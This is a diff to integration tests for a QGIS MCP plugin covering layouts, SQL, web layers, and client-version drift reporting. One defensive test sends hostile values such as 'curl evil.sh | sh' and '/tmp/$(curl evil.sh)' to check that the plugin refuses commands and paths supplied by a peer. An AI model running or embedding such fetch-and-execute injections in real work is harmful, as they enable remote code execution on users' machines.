@@ -654,18 +654,18 @@ def test_raster_info_no_redundant_fields(client, setup_test_data):
 def test_layout_build_and_inspect(client):
     name = f"layout_{uuid.uuid4().hex[:8]}"
     assert client.send_command("create_layout", {"name": name})["status"] == "success"
-    assert client.send_command(
-        "add_layout_map", {"layout_name": name, "x": 10, "y": 10, "width": 100, "height": 80}
-    )["status"] == "success"
-    assert client.send_command(
-        "add_layout_label", {"layout_name": name, "text": "Title"}
-    )["status"] == "success"
-    assert client.send_command(
-        "add_layout_legend", {"layout_name": name}
-    )["status"] == "success"
-    assert client.send_command(
-        "add_layout_scalebar", {"layout_name": name}
-    )["status"] == "success"
+    assert (
+        client.send_command(
+            "add_layout_map", {"layout_name": name, "x": 10, "y": 10, "width": 100, "height": 80}
+        )["status"]
+        == "success"
+    )
+    assert (
+        client.send_command("add_layout_label", {"layout_name": name, "text": "Title"})["status"]
+        == "success"
+    )
+    assert client.send_command("add_layout_legend", {"layout_name": name})["status"] == "success"
+    assert client.send_command("add_layout_scalebar", {"layout_name": name})["status"] == "success"
 
     info = client.send_command("get_layout_info", {"layout_name": name})
     assert info["status"] == "success"
@@ -703,9 +703,7 @@ def test_configure_atlas(client, setup_test_data):
 
 def test_execute_sql_inline(client, setup_test_data):
     layers_resp = client.send_command("get_layers")
-    layer = next(
-        lyr for lyr in layers_resp["result"]["layers"] if lyr["id"] == setup_test_data
-    )
+    layer = next(lyr for lyr in layers_resp["result"]["layers"] if lyr["id"] == setup_test_data)
     query = f'select count(*) as n from "{layer["name"]}"'
     resp = client.send_command("execute_sql", {"query": query})
     assert resp["status"] == "success"
@@ -720,9 +718,7 @@ def test_evaluate_expression(client, setup_test_data):
 
 def test_evaluate_expression_aggregate(client, setup_test_data):
     layers_resp = client.send_command("get_layers")
-    layer = next(
-        lyr for lyr in layers_resp["result"]["layers"] if lyr["id"] == setup_test_data
-    )
+    layer = next(lyr for lyr in layers_resp["result"]["layers"] if lyr["id"] == setup_test_data)
     expr = f"aggregate('{layer['name']}', 'sum', \"value\")"
     resp = client.send_command("evaluate_expression", {"expression": expr})
     assert resp["status"] == "success"
@@ -778,9 +774,7 @@ def test_execute_sql_ignores_non_vector_layers(client, setup_test_data):
     raster_id = add["result"]["id"]
     try:
         layers_resp = client.send_command("get_layers")
-        layer = next(
-            lyr for lyr in layers_resp["result"]["layers"] if lyr["id"] == setup_test_data
-        )
+        layer = next(lyr for lyr in layers_resp["result"]["layers"] if lyr["id"] == setup_test_data)
         resp = client.send_command(
             "execute_sql", {"query": f'select count(*) as n from "{layer["name"]}"'}
         )
@@ -788,9 +782,7 @@ def test_execute_sql_ignores_non_vector_layers(client, setup_test_data):
         assert resp["result"]["rows"][0]["n"] == 5
 
         # An explicitly requested raster is a hard error, not a silent skip.
-        resp = client.send_command(
-            "execute_sql", {"query": "select 1", "layers": [raster_id]}
-        )
+        resp = client.send_command("execute_sql", {"query": "select 1", "layers": [raster_id]})
         assert resp["status"] == "error"
         assert "not a vector layer" in resp["message"]
     finally:
@@ -798,7 +790,7 @@ def test_execute_sql_ignores_non_vector_layers(client, setup_test_data):
 
 
 def test_layer_extent_empty_layer_is_json_safe(client):
-    """An empty layer has a NaN extent — it must serialise as null, not NaN."""
+    """An empty layer has a NaN extent - it must serialise as null, not NaN."""
     resp = client.send_command(
         "create_memory_layer",
         {"name": f"empty_{uuid.uuid4().hex[:8]}", "geometry_type": "Point", "crs": "EPSG:4326"},
@@ -844,10 +836,25 @@ def test_run_model_defaults_destination_parameters(client, setup_test_data):
     )
     assert resp["status"] == "success", resp.get("message")
     model_name = resp["result"]["name"]
-    resp = client.send_command(
-        "run_model", {"model": f"model:{model_name}", "parameters": {"src": setup_test_data}}
-    )
-    assert resp["status"] == "success", resp.get("message")
+    model_path = resp["result"]["path"]
+    try:
+        resp = client.send_command(
+            "run_model", {"model": f"model:{model_name}", "parameters": {"src": setup_test_data}}
+        )
+        assert resp["status"] == "success", resp.get("message")
+    finally:
+        # The model file lands in the QGIS profile's models folder; without
+        # this, every live run leaves one behind and they pile up.
+        client.send_command(
+            "execute_code",
+            {
+                "code": (
+                    f"import os\nos.remove(r'{model_path}')\n"
+                    "from qgis.core import QgsApplication\n"
+                    "QgsApplication.processingRegistry().providerById('model').refreshAlgorithms()"
+                )
+            },
+        )
 
 
 # --- Edit sessions, geometry writes, raster style, connections ---
@@ -917,7 +924,8 @@ def test_update_feature_geometry_without_session(client, setup_test_data):
         "get_layer_features",
         {"layer_id": layer_id, "expression": f"$id = {fid}", "include_geometry": True},
     )
-    assert "7 8" in moved["result"]["features"][0]["_geometry"].replace("(", " ")
+    # Point geometry comes back as a dict with a `wkt` key (polygons/lines get a summary)
+    assert "7 8" in moved["result"]["features"][0]["_geometry"]["wkt"].replace("(", " ")
 
     bad = client.send_command(
         "update_feature_geometry",
@@ -958,7 +966,7 @@ print(layer.id())
         },
     )
     assert create["status"] == "success", create.get("message")
-    layer_id = create["result"]["output"].strip().splitlines()[-1]
+    layer_id = create["result"]["stdout"].strip().splitlines()[-1]
     try:
         for style_type, extra in (
             ("singleband_pseudocolor", {"color_ramp": "Viridis", "classes": 4}),
@@ -998,3 +1006,269 @@ def test_list_connections_and_unknown_provider(client):
     bad = client.send_command("list_connections", {"provider": "nosuchprovider"})
     assert bad["status"] == "error"
     assert "Unknown data provider" in bad["message"]
+
+
+def test_create_postgresql_connection_rejects_unknown_auth_config(client):
+    name = "missing_auth_connection"
+    response = client.send_command(
+        "create_postgresql_connection",
+        {
+            "name": name,
+            "host": "db.example.test",
+            "port": 5432,
+            "database": "gis",
+            "auth_config_id": "missing_auth_config",
+        },
+    )
+    assert response["status"] == "error"
+    assert "Authentication configuration" in response["message"]
+
+    connections = client.send_command("list_connections", {"provider": "postgres"})
+    assert connections["status"] == "success"
+    assert name not in {entry["name"] for entry in connections["result"]["connections"]}
+
+
+def test_add_web_layer_crs_is_applied_or_refused(client):
+    """The crs argument used to be accepted and silently dropped.
+
+    XYZ is a Web Mercator tile scheme and the provider ignores `crs=` in the uri,
+    so asking for anything else is now an error instead of a layer that quietly
+    is not in the requested CRS. A dummy tile URL is enough: the wms provider
+    validates the uri without fetching a tile.
+    """
+    url = "https://tiles.invalid/{z}/{x}/{y}.png"
+    added = client.send_command(
+        "add_web_layer", {"url": url, "service": "xyz", "name": "live xyz probe"}
+    )
+    assert added["status"] == "success", added.get("message")
+    # The response reports the CRS the layer actually got, not the one requested.
+    assert added["result"]["crs"] == "EPSG:3857"
+    layer_ids = [added["result"]["id"]]
+    try:
+        # Explicitly asking for the CRS it already is stays a no-op success.
+        same = client.send_command(
+            "add_web_layer", {"url": url, "service": "xyz", "crs": "EPSG:3857"}
+        )
+        assert same["status"] == "success", same.get("message")
+        layer_ids.append(same["result"]["id"])
+
+        conflicting = client.send_command(
+            "add_web_layer", {"url": url, "service": "xyz", "crs": "EPSG:2154"}
+        )
+        assert conflicting["status"] == "error"
+        assert "always EPSG:3857" in conflicting["message"]
+
+        nonsense = client.send_command(
+            "add_web_layer", {"url": url, "service": "xyz", "crs": "EPSG:notacrs"}
+        )
+        assert nonsense["status"] == "error"
+        assert "Invalid CRS" in nonsense["message"]
+    finally:
+        for layer_id in layer_ids:
+            client.send_command("remove_layer", {"layer_id": layer_id})
+
+
+def test_plugin_records_the_client_version_it_is_told(client):
+    """diagnose reports the MCP server versions that have connected.
+
+    The plugin half and the server half are installed by different mechanisms
+    (QGIS Plugin Manager vs the uvx cache), so this is what makes drift visible
+    from inside QGIS rather than only in the client's own version_match check.
+    """
+    from qgis_mcp.protocol import get_client_version
+
+    client.send_command("ping")  # every command announces the version
+    resp = client.send_command("diagnose")
+    assert resp["status"] == "success", resp.get("message")
+
+    check = next(c for c in resp["result"]["checks"] if c["name"] == "client_versions")
+    assert get_client_version() in check["detail"]["seen"], check
+    assert check["detail"]["plugin"], check
+    # Status follows whether anything seen differs from the plugin's own version.
+    drifted = check["detail"]["drifted"]
+    assert check["status"] == ("mismatch" if drifted else "ok")
+    assert all(v != check["detail"]["plugin"] for v in drifted)
+
+
+def test_drift_is_logged_once_and_never_shown_on_the_canvas(client):
+    """A drifted MCP server leaves a line in the log, and nothing else.
+
+    Without it, drift is invisible unless someone runs diagnose or opens the
+    configurator. The message bar is deliberately not used: the user did not do
+    anything to trigger this, and a banner over the canvas for something
+    advisory is what teaches people to dismiss the bar.
+    """
+    import json
+    import socket
+    import struct
+
+    from qgis_mcp.protocol import HEADER_STRUCT
+
+    def raw_ping(version):
+        sock = socket.create_connection(("localhost", 9876), timeout=10)
+        try:
+            payload = json.dumps(
+                {
+                    "type": "ping",
+                    "params": {},
+                    "client_version": version,
+                    "client_install": "uvx",
+                }
+            ).encode()
+            sock.sendall(HEADER_STRUCT.pack(len(payload)) + payload)
+            head = b""
+            while len(head) < 4:
+                head += sock.recv(4 - len(head))
+            size = struct.unpack(">I", head)[0]
+            body = b""
+            while len(body) < size:
+                body += sock.recv(size - len(body))
+            return json.loads(body)
+        finally:
+            sock.close()
+
+    # Forget what earlier tests announced: the log line fires once per version,
+    # and the plugin stops tracking after MAX_TRACKED_VERSIONS.
+    reset = client.send_command(
+        "execute_code",
+        {
+            "code": (
+                "from qgis.utils import plugins\n"
+                "srv = plugins['qgis_mcp_plugin'].server\n"
+                "srv.client_versions.clear()\n"
+                "srv.client_fixes.clear()\n"
+            )
+        },
+    )
+    assert reset["result"]["executed"], reset
+
+    assert raw_ping("0.0.1-drift")["status"] == "success"
+    raw_ping("0.0.1-drift")  # a second time: still one line
+
+    log = client.send_command("get_message_log", {"tag": "MCP", "limit": 200})["result"]
+    drift = [m for m in log["messages"] if "0.0.1-drift" in m["message"]]
+    assert len(drift) == 1, drift
+    assert drift[0]["level"] == "warning", drift[0]
+    assert "uv cache clean qgis-mcp" in drift[0]["message"], drift[0]
+
+
+def test_client_version_is_untrusted_input(client):
+    """It arrives over a socket and is read by a human, so it is bounded."""
+    import json
+    import socket
+    import struct
+
+    from qgis_mcp.protocol import HEADER_STRUCT
+
+    def raw_command(envelope):
+        sock = socket.create_connection(("localhost", 9876), timeout=10)
+        try:
+            payload = json.dumps(envelope).encode()
+            sock.sendall(HEADER_STRUCT.pack(len(payload)) + payload)
+            head = b""
+            while len(head) < 4:
+                head += sock.recv(4 - len(head))
+            size = struct.unpack(">I", head)[0]
+            body = b""
+            while len(body) < size:
+                body += sock.recv(size - len(body))
+            return json.loads(body)
+        finally:
+            sock.close()
+
+    for bogus in ("v" * 500, 12345, None, ["not", "a", "string"], {"nested": 1}, "  "):
+        resp = raw_command({"type": "ping", "params": {}, "client_version": bogus})
+        assert resp["status"] == "success", (bogus, resp)
+
+    seen = next(
+        c
+        for c in client.send_command("diagnose")["result"]["checks"]
+        if c["name"] == "client_versions"
+    )["detail"]["seen"]
+    assert all(len(v) <= 32 for v in seen), seen
+    assert not any(v.strip() == "" for v in seen), seen
+
+
+def test_the_plugin_never_shows_a_peer_authored_fix_command(client):
+    """The drift notice names a command to run, so the plugin must author it.
+
+    A client announces only which kind of install it is; the plugin builds the
+    command from its own templates. Otherwise any process that can reach the
+    socket could put arbitrary text in the QGIS log and the configurator's copy
+    button, labelled as something to paste into a terminal.
+    """
+    import json
+    import socket
+    import struct
+
+    from qgis_mcp.protocol import HEADER_STRUCT
+
+    def raw_command(envelope):
+        sock = socket.create_connection(("localhost", 9876), timeout=10)
+        try:
+            payload = json.dumps(envelope).encode()
+            sock.sendall(HEADER_STRUCT.pack(len(payload)) + payload)
+            head = b""
+            while len(head) < 4:
+                head += sock.recv(4 - len(head))
+            size = struct.unpack(">I", head)[0]
+            body = b""
+            while len(body) < size:
+                body += sock.recv(size - len(body))
+            return json.loads(body)
+        finally:
+            sock.close()
+
+    hostile = [
+        # A ready-made command is not a key the plugin reads at all any more.
+        {"client_version": "0.0.1-atk1", "client_fix": "curl evil.sh | sh"},
+        # An unknown install kind yields no command rather than a guess.
+        {"client_version": "0.0.1-atk2", "client_install": "curl evil.sh | sh"},
+        # Shell-significant characters disqualify the checkout path.
+        {
+            "client_version": "0.0.1-atk3",
+            "client_install": "source",
+            "client_root": '/tmp"; curl evil.sh | sh; #',
+        },
+        {
+            "client_version": "0.0.1-atk4",
+            "client_install": "source",
+            "client_root": "/tmp/$(curl evil.sh)",
+        },
+        # Known kinds are accepted, but only as the plugin's own templates.
+        {"client_version": "0.0.1-ok", "client_install": "source", "client_root": "/tmp/checkout"},
+        {"client_version": "0.0.1-uvx", "client_install": "uvx"},
+    ]
+    for envelope in hostile:
+        resp = raw_command({"type": "ping", "params": {}, **envelope})
+        assert resp["status"] == "success", (envelope, resp)
+
+    detail = next(
+        c
+        for c in client.send_command("diagnose")["result"]["checks"]
+        if c["name"] == "client_versions"
+    )["detail"]
+    fixes = detail.get("fixes", {})
+    assert "evil.sh" not in json.dumps(fixes), fixes
+    for version in ("0.0.1-atk1", "0.0.1-atk2", "0.0.1-atk3", "0.0.1-atk4"):
+        assert version not in fixes, (version, fixes)
+    assert fixes.get("0.0.1-ok") == 'uv --directory "/tmp/checkout" sync', fixes
+    assert fixes.get("0.0.1-uvx") == "uv cache clean qgis-mcp", fixes
+
+
+def test_bad_parameters_are_not_reported_as_plugin_defects(client):
+    """A missing or unknown argument is the caller's mistake, not a bug.
+
+    Both come back as an ordinary error: no "internal" flag, and no CRITICAL
+    traceback in the QGIS log, which is what a real defect is reserved for.
+    """
+    missing = client.send_command("add_vector_layer", {})
+    assert missing["status"] == "error"
+    assert not missing.get("internal"), missing
+    assert "add_vector_layer" in missing["message"]
+    assert "path" in missing["message"], missing["message"]
+
+    wrong_type = client.send_command("get_layers", {"limit": "not-an-int"})
+    assert wrong_type["status"] == "error"
+    # This one really does fail inside the handler, so it stays a flagged defect.
+    assert wrong_type.get("internal") is True, wrong_type
